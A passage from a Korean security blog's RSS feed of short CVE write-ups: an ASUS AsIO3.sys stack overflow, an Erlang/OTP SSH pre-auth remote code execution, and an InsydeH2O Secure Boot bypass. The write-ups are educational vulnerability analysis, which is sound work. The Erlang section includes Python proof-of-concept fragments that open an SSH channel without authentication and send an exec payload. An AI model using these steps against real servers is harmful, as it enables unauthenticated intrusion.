class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">17 00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">18 00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">19 00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">1</span>a <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">1</span>b <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">1</span>c <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">1d</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">1</span>e <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span><span class="hljs-number">1</span>f <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span>     : <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> <span class="hljs-number">00410041</span>`<span class="hljs-number">00410041</span> : <span class="hljs-number">0x00410041</span>`<span class="hljs-number">00410041</span></code></pre><p>&#xB530;&#xB77C;&#xC11C;, <code>Win32PathToNtPath()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD30C;&#xC77C; &#xACBD;&#xB85C; &#xAE38;&#xC774;&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xACE0; ntImagePath &#xBC30;&#xC5F4;&#xC5D0; &#xBCF5;&#xC0AC;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>\\?\</code> &#xD3EC;&#xD568;&#xD55C; 255 &#xBCF4;&#xB2E4; &#xAE34; &#xACBD;&#xB85C;&#xB97C; &#xAC00;&#xC9C4; &#xD30C;&#xC77C;&#xC744; &#xD1B5;&#xD574; Stack Overflow &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1533">https://nvd.nist.gov/vuln/detail/CVE-2025-1533</a></p></li><li><p><a href="https://learn.microsoft.com/en-us/windows/win32/fileio/maximum-file-path-limitation?tabs=registry">https://learn.microsoft.com/en-us/windows/win32/fileio/maximum-file-path-limitation?tabs=registry</a></p></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/bof/">bof</category>
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/ASUS/">ASUS</category>
      
      <category domain="https://hackyboiz.github.io/tags/AsIO3-sys/">AsIO3.sys</category>
      
      
      <comments>https://hackyboiz.github.io/2025/07/02/ogu123/cve-2025-1533/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE‑2025‑32433: Erlang/OTP SSH의 Pre-auth RCE 취약점</title>
      <link>https://hackyboiz.github.io/2025/06/28/bekim/2025-06-28/</link>
      <guid>https://hackyboiz.github.io/2025/06/28/bekim/2025-06-28/</guid>
      <pubDate>Sat, 28 Jun 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2025-32433&quot;&gt;ht</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32433">https://nvd.nist.gov/vuln/detail/CVE-2025-32433</a></li><li><a href="https://www.keysight.com/blogs/en/tech/nwvs/2025/05/23/cve-2025-32433-erlang-otp-ssh-server-rce">https://www.keysight.com/blogs/en/tech/nwvs/2025/05/23/cve-2025-32433-erlang-otp-ssh-server-rce</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>OTP 25 &#x2264; 25.3.2.19</li><li>OTP 26 &#x2264; 26.2.5.10</li><li>OTP 27 &#x2264; 27.3.2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Erlang OTP&#xB294; Open Telecom Platform&#xC758; &#xC57D;&#xC790;&#xB85C;, Erlang&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC2E4;&#xC2DC;&#xAC04; &#xC11C;&#xBC84;&#xB098; &#xBA54;&#xC2DC;&#xC9D5; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xD6A8;&#xC728;&#xC801;&#xC73C;&#xB85C; &#xAC1C;&#xBC1C;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xB2E4;&#xC591;&#xD55C; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xD50C;&#xB7AB;&#xD3FC;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Erlang/OTP&#xC758; SSH &#xC11C;&#xBC84; &#xBAA8;&#xB4C8;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; Pre-auth RCE(Remote Code Execution) &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C;, &#xC778;&#xC99D; &#xC808;&#xCC28; &#xC774;&#xC804;&#xC5D0; SSH &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC798;&#xBABB; &#xCC98;&#xB9AC;&#xD558;&#xC5EC; &#xC778;&#xC99D; &#xC5C6;&#xC774; &#xC6D0;&#xACA9;&#xC5D0;&#xC11C; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xACF5;&#xACA9;&#xC790;&#xB294; SSH &#xC5F0;&#xACB0; &#xC2DC;, &#xC778;&#xC99D; &#xC774;&#xD6C4;&#xC5D0;&#xB9CC; &#xC804;&#xC1A1;&#xB418;&#xC5B4;&#xC57C; &#xD558;&#xB294; <code>SSH_MSG-CHANNEL_OPEN</code>(message number 90)&#xACFC; <code>SSH_MSG_CHANNEL_REQUEST</code>(message number 98) &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC778;&#xC99D; &#xC5C6;&#xC774; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>SSH_MSG-CHANNEL_OPEN</code> &#xBA54;&#xC2DC;&#xC9C0;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC778;&#xC99D;&#xC744; &#xC644;&#xB8CC;&#xD55C; &#xD6C4; &#xC138;&#xC158; &#xCC44;&#xB110;&#xC744; &#xC5F4;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xB418;&#xBA70;, <code>SSH_MSG_CHANNEL_REQUEST</code>&#xB294; &#xC5F4;&#xB9B0; &#xCC44;&#xB110;&#xC744; &#xD1B5;&#xD574; &#xBA85;&#xB839; &#xC2E4;&#xD589; &#xB4F1;&#xC744; &#xC694;&#xCCAD;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p>SSH &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xBA85;&#xC138;(<a href="https://datatracker.ietf.org/doc/html/rfc4254">RFC 4254</a>)&#xC5D0; &#xB530;&#xB974;&#xBA74; &#xC774; &#xBA54;&#xC2DC;&#xC9C0;&#xB4E4;&#xC740; &#xC778;&#xC99D; &#xC774;&#xD6C4;&#xC5D0;&#xB9CC; &#xD5C8;&#xC6A9;&#xB418;&#xC5B4;&#xC57C; &#xD558;&#xACE0;, &#xC774;&#xB974;&#xAC8C; &#xC804;&#xC1A1;&#xB41C; &#xBA54;&#xC2DC;&#xC9C0;&#xB294; &#xC138;&#xC158; &#xC885;&#xB8CC;&#xB85C; &#xCC98;&#xB9AC;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xC758; Erlang/OTP&#xC5D0;&#xC11C; SSH &#xB370;&#xBAAC;&#xC774; &#xC774; &#xADDC;&#xCE59;&#xC744; &#xC801;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC544;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC778;&#xC99D; &#xC5C6;&#xC774;&#xB3C4; &#xC138;&#xC158; &#xCC44;&#xB110;&#xC744; &#xC5F4;&#xACE0;, exec &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0BC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Attack-Flow"><a href="#Attack-Flow" class="headerlink" title="Attack Flow"></a>Attack Flow</h3><p>&#xC544;&#xB798;&#xB294; &#xACF5;&#xAC1C;&#xB41C; PoC &#xCF54;&#xB4DC;&#xB97C; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xD55C; &#xACF5;&#xACA9; &#xD750;&#xB984;&#xC785;&#xB2C8;&#xB2E4;.</p><ol><li>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC640; &#xC11C;&#xBC84;&#xAC00; SSH &#xC138;&#xC158;&#xC744; &#xC2DC;&#xC791;&#xD560; &#xB54C; &#xC11C;&#xB85C;&#xC758; &#xBC84;&#xC804; &#xC815;&#xBCF4;&#xB97C; &#xAD50;&#xD658;&#xD558;&#xC5EC; &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xD638;&#xD658;&#xC131;&#xC744; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB294; SSH-2.0-OpenSSH_8.9 &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC11C;&#xBC84;&#xC640; &#xAD50;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><pre><code class="hljs python">s.sendall(<span class="hljs-string">b&quot;SSH-2.0-OpenSSH_8.9\r\n&quot;</span>)banner = s.recv(<span class="hljs-number">1024</span>)</code></pre><ol><li>&#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;(&#xACF5;&#xACA9;&#xC790;)&#xB294; SSH_MSG_KEXINIT &#xD328;&#xD0B7;&#xC744; &#xC804;&#xC1A1;&#xD558;&#xC5EC; &#xD0A4; &#xAD50;&#xD658; &#xACFC;&#xC815;&#xC744; &#xC2DC;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xBA54;&#xC2DC;&#xC9C0;&#xC5D0;&#xB294; &#xD0A4; &#xAD50;&#xD658; &#xBC29;&#xC2DD;, &#xC554;&#xD638;&#xD654; &#xC54C;&#xACE0;&#xB9AC;&#xC998;, &#xC555;&#xCD95; &#xC635;&#xC158; &#xB4F1;&#xC758; &#xBAA9;&#xB85D;&#xC774; &#xD3EC;&#xD568;&#xB429;&#xB2C8;&#xB2E4;.</li></ol><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_kexinit</span>():</span>    cookie = <span class="hljs-string">b&quot;\x00&quot;</span> * <span class="hljs-number">16</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">name_list</span>(<span class="hljs-params">l</span>):</span>        <span class="hljs-keyword">return</span> string_payload(<span class="hljs-string">&quot;,&quot;</span>.join(l))    <span class="hljs-comment"># Match server-supported algorithms from the log</span>    <span class="hljs-keyword">return</span> (        <span class="hljs-string">b&quot;\x14&quot;</span>        + cookie        + name_list(            [                <span class="hljs-string">&quot;curve25519-sha256&quot;</span>,                <span class="hljs-string">&quot;ecdh-sha2-nistp256&quot;</span>,                <span class="hljs-string">&quot;diffie-hellman-group-exchange-sha256&quot;</span>,                <span class="hljs-string">&quot;diffie-hellman-group14-sha256&quot;</span>,            ]        )  <span class="hljs-comment"># kex algorithms</span>        + name_list([<span class="hljs-string">&quot;rsa-sha2-256&quot;</span>, <span class="hljs-string">&quot;rsa-sha2-512&quot;</span>])  <span class="hljs-comment"># host key algorithms</span>        + name_list([<span class="hljs-string">&quot;aes128-ctr&quot;</span>]) * <span class="hljs-number">2</span>  <span class="hljs-comment"># encryption client-&gt;server, server-&gt;client</span>        + name_list([<span class="hljs-string">&quot;hmac-sha1&quot;</span>]) * <span class="hljs-number">2</span>  <span class="hljs-comment"># MAC algorithms</span>        + name_list([<span class="hljs-string">&quot;none&quot;</span>]) * <span class="hljs-number">2</span>  <span class="hljs-comment"># compression</span>        + name_list([]) * <span class="hljs-number">2</span>  <span class="hljs-comment"># languages</span>        + <span class="hljs-string">b&quot;\x00&quot;</span>        + struct.pack(<span class="hljs-string">&quot;&gt;I&quot;</span>, <span class="hljs-number">0</span>)  <span class="hljs-comment"># first_kex_packet_follows, reserved</span>    )     ... kex_packet = build_kexinit()s.sendall(pad_packet(kex_packet))</code></pre><ol><li>&#xCD08;&#xAE30; &#xD0A4; &#xAD50;&#xD658;&#xC774; &#xB05D;&#xB098;&#xACE0;, &#xACF5;&#xACA9;&#xC790;&#xB294; SSH_MSG_CHANNEL_OPEN &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xD1B5;&#xD574; &#xC138;&#xC158; &#xCC44;&#xB110; &#xC0DD;&#xC131;&#xC744; &#xC694;&#xCCAD;&#xD569;&#xB2C8;&#xB2E4;. &#xC6D0;&#xB798; &#xC774; &#xC694;&#xCCAD;&#xC740; &#xC0AC;&#xC6A9;&#xC790; &#xC778;&#xC99D;&#xC774; &#xB05D;&#xB09C; &#xD6C4;&#xC5D0;&#xB9CC; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_channel_open</span>(<span class="hljs-params">channel_id=<span class="hljs-number">0</span></span>):</span>    <span class="hljs-keyword">return</span> (        <span class="hljs-string">b&quot;\x5a&quot;</span>  <span class="hljs-comment"># SSH_MSG_CHANNEL_OPEN</span>        + string_payload(<span class="hljs-string">&quot;session&quot;</span>)        + struct.pack(<span class="hljs-string">&quot;&gt;I&quot;</span>, channel_id)  <span class="hljs-comment"># sender channel ID</span>        + struct.pack(<span class="hljs-string">&quot;&gt;I&quot;</span>, <span class="hljs-number">0x68000</span>)  <span class="hljs-comment"># initial window size</span>        + struct.pack(<span class="hljs-string">&quot;&gt;I&quot;</span>, <span class="hljs-number">0x10000</span>)  <span class="hljs-comment"># max packet size</span>    )...chan_open = build_channel_open()s.sendall(pad_packet(chan_open))</code></pre><p>&#xD558;&#xC9C0;&#xB9CC; CVE-2025-32433 &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xB294; &#xACBD;&#xC6B0; &#xC11C;&#xBC84;&#xB294; &#xC774; &#xC694;&#xCCAD;&#xC744; &#xC778;&#xC99D; &#xC5C6;&#xC774; &#xC218;&#xB77D;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC778;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C;&#xB3C4; &#xCC44;&#xB110;&#xC744; &#xC5F4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xACF5;&#xACA9;&#xC790;&#xB294; SSH_MSG_CHANNEL_REQUEST &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC804;&#xC1A1;&#xD574;, &#xC5F4;&#xB9B0; &#xCC44;&#xB110;&#xC744; &#xD1B5;&#xD574; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xB3C4;&#xB85D; &#xC694;&#xCCAD;&#xD569;&#xB2C8;&#xB2E4;. &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xC774; &#xBA54;&#xC2DC;&#xC9C0;&#xB294; &#xC778;&#xC99D;&#xB41C; &#xC138;&#xC158; &#xB0B4;&#xC5D0;&#xC11C; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</li></ol><pre><code class="hljs python">chan_req = build_channel_request(    command=<span class="hljs-string">&apos;os:cmd(&quot;touch /tmp/test&quot;).&apos;</span>)s.sendall(pad_packet(chan_req))</code></pre><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC5D0;&#xC11C;&#xB294; &#xC778;&#xC99D;&#xC774; &#xB418;&#xC9C0; &#xC54A;&#xB354;&#xB77C;&#xB3C4; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC218;&#xB77D;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#x201C;exec&#x201D; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xC694;&#xCCAD;&#xC774; &#xD5C8;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xACE0;, &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC6D0;&#xACA9;&#xC5D0;&#xC11C; &#xC784;&#xC758;&#xC758; &#xC258; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/06/28/bekim/2025-06-28/image.png" alt></p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; OTP 27.3.3, 26.2.5.11, 25.3.2.20 &#xC774;&#xC0C1; &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.sonicwall.com/blog/pre-auth-rce-alert-critical-ssh-flaw-in-erlang-otp-cve-2025-32433-">https://www.sonicwall.com/blog/pre-auth-rce-alert-critical-ssh-flaw-in-erlang-otp-cve-2025-32433-</a></p><p><a href="https://github.com/ProDefense/CVE-2025-32433">https://github.com/ProDefense/CVE-2025-32433</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/CVE%E2%80%912025%E2%80%9132433/">CVE‑2025‑32433</category>
      
      <category domain="https://hackyboiz.github.io/tags/Erlang-OTP/">Erlang/OTP</category>
      
      <category domain="https://hackyboiz.github.io/tags/SSH/">SSH</category>
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/bekim/">bekim</category>
      
      
      <comments>https://hackyboiz.github.io/2025/06/28/bekim/2025-06-28/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-4275: InsydeH2O의 NVRAM 변수를 통한 디지털 인증서 삽입으로 인한 Secure Boot bypass</title>
      <link>https://hackyboiz.github.io/2025/06/25/newp1ayer48/CVE-2025-4275/</link>
      <guid>https://hackyboiz.github.io/2025/06/25/newp1ayer48/CVE-2025-4275/</guid>
      <pubDate>Wed, 25 Jun 2025 13:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.kb.cert.org/vuls/id/211341&quot;&gt;https://www</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://www.kb.cert.org/vuls/id/211341">https://www.kb.cert.org/vuls/id/211341</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>InsydeH2O <em>**</em>Kernel 5.2~5.7</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>InsydeH2O UEFI &#xD38C;&#xC6E8;&#xC5B4; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0;&#xC11C; Secure Boot bypass &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC778;&#xC99D;&#xC11C; &#xC800;&#xC7A5;&#xC18C;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; NVRAM &#xBCC0;&#xC218;&#xC758; &#xC548;&#xC804;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xC0AC;&#xC6A9;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>UEFI&#xB294; &#xCD08;&#xAE30; &#xBD80;&#xD305; &#xC2DC;, &#xCD5C;&#xC2E0; &#xD38C;&#xC6E8;&#xC5B4; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC5EC;&#xBD80;&#xB97C; &#xACB0;&#xC815;&#xD558;&#xACE0;, UEFI &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xACFC; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xCD08;&#xAE30;&#xD654;&#xD558;&#xACE0; OS &#xB85C;&#xB354;&#xB85C; &#xB118;&#xC5B4;&#xAC00;&#xB294; &#xACFC;&#xC815;&#xC744; &#xAC70;&#xCE69;&#xB2C8;&#xB2E4;. &#xD38C;&#xC6E8;&#xC5B4; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB294; <code>isflash.bin</code> UEFI &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xC0AC;&#xC6A9;&#xB418;&#xBA70;, &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC758; &#xC11C;&#xBA85;&#xC740; Insyde &#xC778;&#xC99D;&#xC11C;&#xB85C; &#xC11C;&#xBA85;&#xB418;&#xB294; Secure Boot &#xB9E4;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC11C;&#xBA85; &#xAC80;&#xC99D; &#xACFC;&#xC815;&#xC740; <code>BdsDxe</code> &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xD38C;&#xC6E8;&#xC5B4; &#xC678;&#xBD80;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xC5B4; &#xD38C;&#xC6E8;&#xC5B4; &#xC5C5;&#xB370;&#xC774;&#xD130;&#xC758; &#xC11C;&#xBA85; &#xC778;&#xC99D;&#xC11C;&#xB97C; &#xC77D;&#xACE0;, <code>SecurityStubDxe</code> &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; &#xC804;&#xB2EC;&#xD558;&#xC5EC; Authenticode &#xC11C;&#xBA85; &#xAC80;&#xC99D;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xC804;&#xB2EC; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <code>SecureFlashDxe</code> &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xD1B5;&#xD574; &#xC778;&#xC99D;&#xC11C;&#xB97C; &#xD718;&#xBC1C;&#xC131; NVRAM &#xBCC0;&#xC218;&#xC5D0; &#xB85C;&#xB4DC; &#xD558;&#xB3C4;&#xB85D; &#xBCC0;&#xC218;&#xB97C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function">_int64 <span class="hljs-title">LoadCertificateToVariable</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{UINTN v0; <span class="hljs-comment">// rbx</span>int64 v1; <span class="hljs-comment">// rbx</span>EFI_FIRMWARE_VOLUME2_PROTOCOL *Interface; <span class="hljs-comment">// [rsp+40h] [rbp-28h] BYREF</span>UINTN DataSize; <span class="hljs-comment">// [rsp+48h] [rbp-20h] BYREF</span>EFI_HANDLE *Buffer; <span class="hljs-comment">// [rsp+50h] [rbp-18h] BYREF</span><span class="hljs-keyword">char</span> v6; <span class="hljs-comment">// [rsp+80h] [rbp+18h] BYREF</span>UINT32 v7; <span class="hljs-comment">// [rsp+88h] [rbp+20h] BYREF</span>UINTN NoHandles; <span class="hljs-comment">// [rsp+90h] [rbp+28h] BYREF</span><span class="hljs-keyword">void</span> *Data; <span class="hljs-comment">// [rsp+98h] [rbp+30h] BYREF</span>Interface = <span class="hljs-number">0</span>;v7 = <span class="hljs-number">0</span>;<span class="hljs-keyword">if</span> ((gBS-&gt;LocateHandleBuffer(ByProtocol, &amp;EFI_FIRMWARE_VOLUME2_PROTOCOL_GUID, <span class="hljs-number">0</span>, &amp;NoHandles, &amp;Buffer) &amp; <span class="hljs-number">0x8000000000000000</span>uLL) == <span class="hljs-number">0L</span>L&amp;&amp; NoHandles ){v0 = <span class="hljs-number">0</span>;<span class="hljs-keyword">while</span> ((gBS-&gt;HandleProtocol(Buffer [v0], &amp;EFI_FIRMWARE_VOLUME2_PROTOCOL_GUID, (<span class="hljs-keyword">void</span> **)&amp;Interface) &amp; <span class="hljs-number">0x8000000000000000</span>uLL) == <span class="hljs-number">0L</span>L){Data = <span class="hljs-number">0</span>;DataSize = <span class="hljs-number">0</span>;<span class="hljs-keyword">if</span> ((Interface-&gt;ReadSection (Interface, &amp;SECURE_FLASH_FV_CERT_GUID, <span class="hljs-number">0x19</span>u, <span class="hljs-number">0</span>, &amp;Data, &amp;DataSize, &amp;v7) &amp; <span class="hljs-number">0x8000000000000000</span>uLL) != &#xD8;LL &amp;&amp; ++v0 &lt; NoHandles ){<span 